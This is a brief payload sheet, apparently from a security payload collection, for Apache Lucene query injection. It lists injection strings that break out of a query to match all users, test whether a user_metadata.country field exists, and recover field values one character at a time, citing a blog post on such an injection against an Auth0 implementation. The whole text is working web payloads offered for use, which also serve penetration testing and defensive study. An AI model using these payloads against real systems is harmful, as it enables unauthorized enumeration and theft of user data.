# Apache Lucene

## Payloads

```
  // Break out of the query and query all users using the name field
  1)+OR+(name:*)+OR+(name:*

  // Perform a boolean-based condition checking if the user_metadata.country field exists
  1)+OR+(name:*)+AND+(_exists_:user_metadata.country

  // Discover values by searching one character at a time
  1)+OR+(name:*)+AND+(user_metadata.country:C*
  1)+OR+(name:*)+AND+(user_metadata.country:Ca*
```

* Source: <https://blog.stratumsecurity.com/2023/12/18/apache-lucene-injection-on-auth0-implementation/>

